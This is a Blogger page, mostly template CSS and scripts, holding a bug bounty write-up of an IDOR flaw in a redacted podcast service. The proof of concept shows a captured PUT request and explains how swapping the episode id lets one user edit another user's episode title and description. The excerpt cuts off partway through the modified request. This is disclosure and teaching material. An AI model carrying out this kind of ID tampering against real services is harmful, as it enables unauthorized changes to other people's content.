@@ -1,0 +1,1446 @@
+<!DOCTYPE html>
+<html class='v2' dir='ltr' lang='en-GB'>
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/3566091532-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
+<meta content='width=1100' name='viewport'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='blogger' name='generator'/>
+<link href="https://blog.evanricafort.com/favicon.ico" rel='icon' type='image/x-icon' />
+<link href="https://blog.evanricafort.com/2021/02/idor-in-redacted.html" rel='canonical' />
+<link rel="alternate" type="application/atom+xml" title="Evan Ricafort | Blog - Atom" href="https://blog.evanricafort.com/feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="Evan Ricafort | Blog - RSS" href="https://blog.evanricafort.com/feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="Evan Ricafort | Blog - Atom" href="https://www.blogger.com/feeds/644826486480529000/posts/default" />
+
+<link rel="alternate" type="application/atom+xml" title="Evan Ricafort | Blog - Atom" href="https://blog.evanricafort.com/feeds/455639502551743521/comments/default" />
+<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
+<meta content='Bug Bounty, XSS, Infosec, Hacking, Insecure Direct Object Vulnerability, Session Misconfiguration, Open Redirect, Spotify, Anchor FM' name='description'/>
+<meta content='http://blog.evanricafort.com/2021/02/idor-in-redacted.html' property='og:url'/>
+<meta content='Changing other users Episode title &amp; description - IDOR Vulnerability in [REDACTED] (Write Up)' property='og:title'/>
+<meta content='Bug Bounty, XSS, Infosec, Hacking, Insecure Direct Object Vulnerability, Session Misconfiguration, Open Redirect, Spotify, Anchor FM' property='og:description'/>
+<title>Evan Ricafort | Blog: Changing other users Episode title & description - IDOR Vulnerability in [REDACTED] (Write Up)</title>
+<style id='page-skin-1' type='text/css'><!--
+/*
+-----------------------------------------------
+Blogger Template Style
+Name:     Awesome Inc.
+Designer: Tina Chen
+URL:      tinachen.org
+----------------------------------------------- */
+/* Content
+----------------------------------------------- */
+body {
+font: normal normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #ffffff;
+background: #000000 url(https://resources.blogblog.com/blogblog/data/1kt/awesomeinc/body_background_dark.png) repeat scroll top left;
+}
+html body .content-outer {
+min-width: 0;
+max-width: 100%;
+width: 100%;
+}
+a:link {
+text-decoration: none;
+color: #888888;
+}
+a:visited {
+text-decoration: none;
+color: #444444;
+}
+a:hover {
+text-decoration: underline;
+color: #cccccc;
+}
+.body-fauxcolumn-outer .cap-top {
+position: absolute;
+z-index: 1;
+height: 276px;
+width: 100%;
+background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/awesomeinc/body_gradient_dark.png) repeat-x scroll top left;
+_background-image: none;
+}
+/* Columns
+----------------------------------------------- */
+.content-inner {
+padding: 0;
+}
+.header-inner .section {
+margin: 0 16px;
+}
+.tabs-inner .section {
+margin: 0 16px;
+}
+.main-inner {
+padding-top: 30px;
+}
+.main-inner .column-center-inner,
+.main-inner .column-left-inner,
+.main-inner .column-right-inner {
+padding: 0 5px;
+}
+*+html body .main-inner .column-center-inner {
+margin-top: -30px;
+}
+#layout .main-inner .column-center-inner {
+margin-top: 0;
+}
+/* Header
+----------------------------------------------- */
+.header-outer {
+margin: 0 0 0 0;
+background: transparent none repeat scroll 0 0;
+}
+.Header h1 {
+font: normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #ffffff;
+text-shadow: 0 0 -1px #000000;
+}
+.Header h1 a {
+color: #ffffff;
+}
+.Header .description {
+font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #ffffff;
+}
+.header-inner .Header .titlewrapper,
+.header-inner .Header .descriptionwrapper {
+padding-left: 0;
+padding-right: 0;
+margin-bottom: 0;
+}
+.header-inner .Header .titlewrapper {
+padding-top: 22px;
+}
+/* Tabs
+----------------------------------------------- */
+.tabs-outer {
+overflow: hidden;
+position: relative;
+background: #141414 none repeat scroll 0 0;
+}
+#layout .tabs-outer {
+overflow: visible;
+}
+.tabs-cap-top, .tabs-cap-bottom {
+position: absolute;
+width: 100%;
+border-top: 1px solid #222222;
+}
+.tabs-cap-bottom {
+bottom: 0;
+}
+.tabs-inner .widget li a {
+display: inline-block;
+margin: 0;
+padding: .6em 1.5em;
+font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #ffffff;
+border-top: 1px solid #222222;
+border-bottom: 1px solid #222222;
+border-left: 1px solid #222222;
+height: 16px;
+line-height: 16px;
+}
+.tabs-inner .widget li:last-child a {
+border-right: 1px solid #222222;
+}
+.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
+background: #444444 none repeat-x scroll 0 -100px;
+color: #ffffff;
+}
+/* Headings
+----------------------------------------------- */
+h2 {
+font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #ffffff;
+}
+/* Widgets
+----------------------------------------------- */
+.main-inner .section {
+margin: 0 27px;
+padding: 0;
+}
+.main-inner .column-left-outer,
+.main-inner .column-right-outer {
+margin-top: 0;
+}
+#layout .main-inner .column-left-outer,
+#layout .main-inner .column-right-outer {
+margin-top: 0;
+}
+.main-inner .column-left-inner,
+.main-inner .column-right-inner {
+background: transparent none repeat 0 0;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+#layout .main-inner .column-left-inner,
+#layout .main-inner .column-right-inner {
+margin-top: 0;
+}
+.sidebar .widget {
+font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #ffffff;
+}
+.sidebar .widget a:link {
+color: #888888;
+}
+.sidebar .widget a:visited {
+color: #444444;
+}
+.sidebar .widget a:hover {
+color: #cccccc;
+}
+.sidebar .widget h2 {
+text-shadow: 0 0 -1px #000000;
+}
+.main-inner .widget {
+background-color: #141414;
+border: 1px solid #222222;
+padding: 0 15px 15px;
+margin: 20px -16px;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+.main-inner .widget h2 {
+margin: 0 -15px;
+padding: .6em 15px .5em;
+border-bottom: 1px solid #000000;
+}
+.footer-inner .widget h2 {
+padding: 0 0 .4em;
+border-bottom: 1px solid #000000;
+}
+.main-inner .widget h2 + div, .footer-inner .widget h2 + div {
+border-top: 1px solid #222222;
+padding-top: 8px;
+}
+.main-inner .widget .widget-content {
+margin: 0 -15px;
+padding: 7px 15px 0;
+}
+.main-inner .widget ul, .main-inner .widget #ArchiveList ul.flat {
+margin: -8px -15px 0;
+padding: 0;
+list-style: none;
+}
+.main-inner .widget #ArchiveList {
+margin: -8px 0 0;
+}
+.main-inner .widget ul li, .main-inner .widget #ArchiveList ul.flat li {
+padding: .5em 15px;
+text-indent: 0;
+color: #666666;
+border-top: 1px solid #222222;
+border-bottom: 1px solid #000000;
+}
+.main-inner .widget #ArchiveList ul li {
+padding-top: .25em;
+padding-bottom: .25em;
+}
+.main-inner .widget ul li:first-child, .main-inner .widget #ArchiveList ul.flat li:first-child {
+border-top: none;
+}
+.main-inner .widget ul li:last-child, .main-inner .widget #ArchiveList ul.flat li:last-child {
+border-bottom: none;
+}
+.post-body {
+position: relative;
+}
+.main-inner .widget .post-body ul {
+padding: 0 2.5em;
+margin: .5em 0;
+list-style: disc;
+}
+.main-inner .widget .post-body ul li {
+padding: 0.25em 0;
+margin-bottom: .25em;
+color: #ffffff;
+border: none;
+}
+.footer-inner .widget ul {
+padding: 0;
+list-style: none;
+}
+.widget .zippy {
+color: #666666;
+}
+/* Posts
+----------------------------------------------- */
+body .main-inner .Blog {
+padding: 0;
+margin-bottom: 1em;
+background-color: transparent;
+border: none;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
+box-shadow: 0 0 0 rgba(0, 0, 0, 0);
+}
+.main-inner .section:last-child .Blog:last-child {
+padding: 0;
+margin-bottom: 1em;
+}
+.main-inner .widget h2.date-header {
+margin: 0 -15px 1px;
+padding: 0 0 0 0;
+font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #666666;
+background: transparent none no-repeat scroll top left;
+border-top: 0 solid #222222;
+border-bottom: 1px solid #000000;
+-moz-border-radius-topleft: 0;
+-moz-border-radius-topright: 0;
+-webkit-border-top-left-radius: 0;
+-webkit-border-top-right-radius: 0;
+border-top-left-radius: 0;
+border-top-right-radius: 0;
+position: static;
+bottom: 100%;
+right: 15px;
+text-shadow: 0 0 -1px #000000;
+}
+.main-inner .widget h2.date-header span {
+font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+display: block;
+padding: .5em 15px;
+border-left: 0 solid #222222;
+border-right: 0 solid #222222;
+}
+.date-outer {
+position: relative;
+margin: 30px 0 20px;
+padding: 0 15px;
+background-color: #141414;
+border: 1px solid #222222;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+.date-outer:first-child {
+margin-top: 0;
+}
+.date-outer:last-child {
+margin-bottom: 20px;
+-moz-border-radius-bottomleft: 0;
+-moz-border-radius-bottomright: 0;
+-webkit-border-bottom-left-radius: 0;
+-webkit-border-bottom-right-radius: 0;
+-goog-ms-border-bottom-left-radius: 0;
+-goog-ms-border-bottom-right-radius: 0;
+border-bottom-left-radius: 0;
+border-bottom-right-radius: 0;
+}
+.date-posts {
+margin: 0 -15px;
+padding: 0 15px;
+clear: both;
+}
+.post-outer, .inline-ad {
+border-top: 1px solid #222222;
+margin: 0 -15px;
+padding: 15px 15px;
+}
+.post-outer {
+padding-bottom: 10px;
+}
+.post-outer:first-child {
+padding-top: 0;
+border-top: none;
+}
+.post-outer:last-child, .inline-ad:last-child {
+border-bottom: none;
+}
+.post-body {
+position: relative;
+}
+.post-body img {
+padding: 8px;
+background: #222222;
+border: 1px solid transparent;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+border-radius: 0;
+}
+h3.post-title, h4 {
+font: normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #ffffff;
+}
+h3.post-title a {
+font: normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #ffffff;
+}
+h3.post-title a:hover {
+color: #cccccc;
+text-decoration: underline;
+}
+.post-header {
+margin: 0 0 1em;
+}
+.post-body {
+line-height: 1.4;
+}
+.post-outer h2 {
+color: #ffffff;
+}
+.post-footer {
+margin: 1.5em 0 0;
+}
+#blog-pager {
+padding: 15px;
+font-size: 120%;
+background-color: #141414;
+border: 1px solid #222222;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+-moz-border-radius-topleft: 0;
+-moz-border-radius-topright: 0;
+-webkit-border-top-left-radius: 0;
+-webkit-border-top-right-radius: 0;
+-goog-ms-border-top-left-radius: 0;
+-goog-ms-border-top-right-radius: 0;
+border-top-left-radius: 0;
+border-top-right-radius-topright: 0;
+margin-top: 1em;
+}
+.blog-feeds, .post-feeds {
+margin: 1em 0;
+text-align: center;
+color: #ffffff;
+}
+.blog-feeds a, .post-feeds a {
+color: #888888;
+}
+.blog-feeds a:visited, .post-feeds a:visited {
+color: #444444;
+}
+.blog-feeds a:hover, .post-feeds a:hover {
+color: #cccccc;
+}
+.post-outer .comments {
+margin-top: 2em;
+}
+/* Comments
+----------------------------------------------- */
+.comments .comments-content .icon.blog-author {
+background-repeat: no-repeat;
+background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
+}
+.comments .comments-content .loadmore a {
+border-top: 1px solid #222222;
+border-bottom: 1px solid #222222;
+}
+.comments .continue {
+border-top: 2px solid #222222;
+}
+/* Footer
+----------------------------------------------- */
+.footer-outer {
+margin: -0 0 -1px;
+padding: 0 0 0;
+color: #ffffff;
+overflow: hidden;
+}
+.footer-fauxborder-left {
+border-top: 1px solid #222222;
+background: #141414 none repeat scroll 0 0;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+box-shadow: 0 0 0 rgba(0, 0, 0, .2);
+margin: 0 -0;
+}
+/* Mobile
+----------------------------------------------- */
+body.mobile {
+background-size: auto;
+}
+.mobile .body-fauxcolumn-outer {
+background: transparent none repeat scroll top left;
+}
+*+html body.mobile .main-inner .column-center-inner {
+margin-top: 0;
+}
+.mobile .main-inner .widget {
+padding: 0 0 15px;
+}
+.mobile .main-inner .widget h2 + div,
+.mobile .footer-inner .widget h2 + div {
+border-top: none;
+padding-top: 0;
+}
+.mobile .footer-inner .widget h2 {
+padding: 0.5em 0;
+border-bottom: none;
+}
+.mobile .main-inner .widget .widget-content {
+margin: 0;
+padding: 7px 0 0;
+}
+.mobile .main-inner .widget ul,
+.mobile .main-inner .widget #ArchiveList ul.flat {
+margin: 0 -15px 0;
+}
+.mobile .main-inner .widget h2.date-header {
+right: 0;
+}
+.mobile .date-header span {
+padding: 0.4em 0;
+}
+.mobile .date-outer:first-child {
+margin-bottom: 0;
+border: 1px solid #222222;
+-moz-border-radius-topleft: 0;
+-moz-border-radius-topright: 0;
+-webkit-border-top-left-radius: 0;
+-webkit-border-top-right-radius: 0;
+-goog-ms-border-top-left-radius: 0;
+-goog-ms-border-top-right-radius: 0;
+border-top-left-radius: 0;
+border-top-right-radius: 0;
+}
+.mobile .date-outer {
+border-color: #222222;
+border-width: 0 1px 1px;
+}
+.mobile .date-outer:last-child {
+margin-bottom: 0;
+}
+.mobile .main-inner {
+padding: 0;
+}
+.mobile .header-inner .section {
+margin: 0;
+}
+.mobile .post-outer, .mobile .inline-ad {
+padding: 5px 0;
+}
+.mobile .tabs-inner .section {
+margin: 0 10px;
+}
+.mobile .main-inner .widget h2 {
+margin: 0;
+padding: 0;
+}
+.mobile .main-inner .widget h2.date-header span {
+padding: 0;
+}
+.mobile .main-inner .widget .widget-content {
+margin: 0;
+padding: 7px 0 0;
+}
+.mobile #blog-pager {
+border: 1px solid transparent;
+background: #141414 none repeat scroll 0 0;
+}
+.mobile .main-inner .column-left-inner,
+.mobile .main-inner .column-right-inner {
+background: transparent none repeat 0 0;
+-moz-box-shadow: none;
+-webkit-box-shadow: none;
+-goog-ms-box-shadow: none;
+box-shadow: none;
+}
+.mobile .date-posts {
+margin: 0;
+padding: 0;
+}
+.mobile .footer-fauxborder-left {
+margin: 0;
+border-top: inherit;
+}
+.mobile .main-inner .section:last-child .Blog:last-child {
+margin-bottom: 0;
+}
+.mobile-index-contents {
+color: #ffffff;
+}
+.mobile .mobile-link-button {
+background: #888888 none repeat scroll 0 0;
+}
+.mobile-link-button a:link, .mobile-link-button a:visited {
+color: #ffffff;
+}
+.mobile .tabs-inner .PageList .widget-content {
+background: transparent;
+border-top: 1px solid;
+border-color: #222222;
+color: #ffffff;
+}
+.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
+border-left: 1px solid #222222;
+}
+
+--></style>
+<style id='template-skin-1' type='text/css'><!--
+body {
+min-width: 1100px;
+}
+.content-outer, .content-fauxcolumn-outer, .region-inner {
+min-width: 1100px;
+max-width: 1100px;
+_width: 1100px;
+}
+.main-inner .columns {
+padding-left: 0;
+padding-right: 310px;
+}
+.main-inner .fauxcolumn-center-outer {
+left: 0;
+right: 310px;
+/* IE6 does not respect left and right together */
+_width: expression(this.parentNode.offsetWidth -
+parseInt("0") -
+parseInt("310px") + 'px');
+}
+.main-inner .fauxcolumn-left-outer {
+width: 0;
+}
+.main-inner .fauxcolumn-right-outer {
+width: 310px;
+}
+.main-inner .column-left-outer {
+width: 0;
+right: 100%;
+margin-left: -0;
+}
+.main-inner .column-right-outer {
+width: 310px;
+margin-right: -310px;
+}
+#layout {
+min-width: 0;
+}
+#layout .content-outer {
+min-width: 0;
+width: 800px;
+}
+#layout .region-inner {
+min-width: 0;
+width: auto;
+}
+body#layout div.add_widget {
+padding: 8px;
+}
+body#layout div.add_widget a {
+margin-left: 32px;
+}
+--></style>
+<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=644826486480529000&amp;zx=4e8e3ef6-5c44-4c10-b639-aabf608a02d3' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=644826486480529000&amp;zx=4e8e3ef6-5c44-4c10-b639-aabf608a02d3' rel='stylesheet'/></noscript>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+
+<!-- data-ad-client=ca-pub-5866391232382804 -->
+
+</head>
+<body class='loading variant-dark'>
+<div class='navbar section' id='navbar' name='Navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+  </script>
+<div id="navbar-iframe-container"></div>
+<script type="text/javascript" src="https://apis.google.com/js/platform.js"></script>
+<script type="text/javascript">
+      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
+        if (gapi.iframes && gapi.iframes.getContext) {
+          gapi.iframes.getContext().openChild({
+              url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d644826486480529000\x26blogName\x3dEvan+Ricafort+%7C+Blog\x26publishMode\x3dPUBLISH_MODE_HOSTED\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttp://blog.evanricafort.com/search\x26blogLocale\x3den_GB\x26v\x3d2\x26homepageUrl\x3dhttp://blog.evanricafort.com/\x26targetPostID\x3d455639502551743521\x26blogPostOrPageUrl\x3dhttp://blog.evanricafort.com/2021/02/idor-in-redacted.html\x26vt\x3d-2052869297473955617',
+              where: document.getElementById("navbar-iframe-container"),
+              id: "navbar-iframe",
+              messageHandlersFilter: gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER,
+              messageHandlers: {
+                'blogger-ping': function() {}
+              }
+          });
+        }
+      });
+    </script><script type="text/javascript">
+(function() {
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
+var head = document.getElementsByTagName('head')[0];
+if (head) {
+head.appendChild(script);
+}})();
+</script>
+</div></div>
+<div class='body-fauxcolumns'>
+<div class='fauxcolumn-outer body-fauxcolumn-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<div class='content'>
+<div class='content-fauxcolumns'>
+<div class='fauxcolumn-outer content-fauxcolumn-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<div class='content-outer'>
+<div class='content-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left content-fauxborder-left'>
+<div class='fauxborder-right content-fauxborder-right'></div>
+<div class='content-inner'>
+<header>
+<div class='header-outer'>
+<div class='header-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left header-fauxborder-left'>
+<div class='fauxborder-right header-fauxborder-right'></div>
+<div class='region-inner header-inner'>
+<div class='header section' id='header' name='Header'><div class='widget Header' data-version='1' id='Header1'>
+<div id='header-inner'>
+<div class='titlewrapper'>
+<h1 class='title'>
+<a href="https://blog.evanricafort.com/">
+Evan Ricafort | Blog
+</a>
+</h1>
+</div>
+<div class='descriptionwrapper'>
+<p class='description'><span>Will hack for burger &amp; fries!</span></p>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<div class='header-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</header>
+<div class='tabs-outer'>
+<div class='tabs-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left tabs-fauxborder-left'>
+<div class='fauxborder-right tabs-fauxborder-right'></div>
+<div class='region-inner tabs-inner'>
+<div class='tabs no-items section' id='crosscol' name='Cross-column'></div>
+<div class='tabs no-items section' id='crosscol-overflow' name='Cross-Column 2'></div>
+</div>
+</div>
+<div class='tabs-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='main-outer'>
+<div class='main-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left main-fauxborder-left'>
+<div class='fauxborder-right main-fauxborder-right'></div>
+<div class='region-inner main-inner'>
+<div class='columns fauxcolumns'>
+<div class='fauxcolumn-outer fauxcolumn-center-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='fauxcolumn-outer fauxcolumn-left-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<div class='fauxcolumn-outer fauxcolumn-right-outer'>
+<div class='cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left'>
+<div class='fauxborder-right'></div>
+<div class='fauxcolumn-inner'>
+</div>
+</div>
+<div class='cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<!-- corrects IE6 width calculation -->
+<div class='columns-inner'>
+<div class='column-center-outer'>
+<div class='column-center-inner'>
+<div class='main section' id='main' name='Main'><div class='widget Blog' data-version='1' id='Blog1'>
+<div class='blog-posts hfeed'>
+
+          <div class="date-outer">
+        
+<h2 class='date-header'><span>Saturday, February 13, 2021</span></h2>
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='644826486480529000' itemprop='blogId'/>
+<meta content='455639502551743521' itemprop='postId'/>
+<a name='455639502551743521'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+Changing other users Episode title & description - IDOR Vulnerability in [REDACTED] (Write Up)
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-455639502551743521' itemprop='articleBody'>
+Good day everyone, hope you are doing great.&nbsp;<div><br /></div><div>It's been a while since I posted on this blog and today I will show you another simple vulnerability that I found few years ago on [REDACTED] (https://[redacted.com]), one of [REDACTED]'s acquisition company. The vulnerability allow me to change other users Episode titles &amp; description without any user interaction.<br />
+<br />
+So it was a cold &amp; lazy Wednesday night that time when I started reading some of my old reports and decided to re-check some of it. I started with my old report on [REDACTED] which is a Cross Site Scripting that I reported few years ago and I noticed that there is no changes on that subdomain after the fix was released. So I fired up my recon tools to check other subdomains and directories of [REDACTED] and there is no interesting stuff found so I decided to check on their acquisitions and found an interesting one which is the [REDACTED] (https://[redacted.com]). so I fired up my recon tools again to check on for subdomains and directories since my method of testing is I started with the subdomains.<br />
+<br />
+After a few hours of testing, I found multiple vulnerabilities including Stored XSS, Open Redirect, Reflected XSS, Session Management Issue and the most interesting one, the Insecure Direct Object Reference vulnerability. So long story short, I found some good bugs and reported it to them and unfortunately no one made it for a bounty since this domain is not on their scope (and yes! I'm aware of that, just trying my luck.) so I asked a permission to them for this write up so that I can share it with you guys.</div><div><br /></div><div><br />
+<br />
+<b><i>--Proof of Concept--</i></b><br /><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: center;"><br /><div style="text-align: left;"><b>User A (attacker id - e3mid0) &amp; B (victim id - e3mhq4)</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><i>Go to https://[redacted.com]/dashboard/episode/e3mid0/metadata/edit (User A)</i></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><i>Click the "Update episode" button and capture the request (I used burp to capture the request)</i></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b><i>Raw HTTP Request (Attacker)</i></b></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><i></i></div><blockquote><div style="text-align: left;"><i>PUT /api/podcastepisode/<b>e3mid0 &lt;attacker id&gt;</b>/metadata HTTP/1.1</i></div><div style="text-align: left;"><i>Host: [redacted.com]</i></div><div style="text-align: left;"><i>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</i></div><div style="text-align: left;"><i>Accept: /</i></div><div style="text-align: left;"><i>Accept-Language: en-GB,en;q=0.5</i></div><div style="text-align: left;"><i>Accept-Encoding: gzip, deflate</i></div><div style="text-align: left;"><i>content-type: application/json</i></div><div style="text-align: left;"><i>origin: https://</i><i>[redacted.com]</i></div><div style="text-align: left;"><i>Referer: https://[redacted.com]/dashboard/episode/e3mid0/metadata/edit</i></div><div style="text-align: left;"><i>Content-Length: 661</i></div><div style="text-align: left;"><i>Cookie: XXXXXXXXXXXX</i></div><div style="text-align: left;"><i>Connection: close</i></div><div style="text-align: left;"><i><br /></i></div><div style="text-align: left;"><i>{"isDraft":false,"podcastEpisodeIsExplicit":false,"podcastEpisodeType":"full","publishOn":null,"created":"2019-04-09T18:37:20.000Z","description":"&lt;p&gt;test1&lt;/p&gt;","podcastEpisodeNumber":1,"podcastSeasonNumber":1,"safeDescription":"&lt;p&gt;test1&lt;/p&gt;","title":"test1 for idor","doPublishExternally":true,"episodeAudios":[{"durationHMS":"10s","audioId":"a1ptlh","audioTransformationStatus":null,"caption":"Alley","color":"#fface7","created":"2016-12-02T22:25:38.000Z","doesHaveGeneratedVideo":false,"duration":10443,"key":"a1ptlh-0","sort":0,"userId":null,"url":"</i><i>[redacted.com]</i><i>}</i></div></blockquote><div style="text-align: left;"><i></i></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><i>Send the captured request to Repeater and change the episode id from attacker to victim id and change some of the information's&nbsp;like the title, description and etc...</i></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b><i>Modified HTTP Request (Attacker)</i></b></div><div style="text-align: left;"><b><i><br /></i></b></div><div style="text-align: left;">In the modified request, the attacker can change the episode id in the URL request which can be found from the victim's episode. if you will say that it's hard to enumerate that kind of ID since it's a mix of random letters and numbers then no, the [REDACTED] episode ID of any users is visible to anyone that is why it is so easy to know your victim's ID.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><i></i></div><blockquote><div style="text-align: left;"><i>PUT /api/podcastepisode/<b>e3mhq4 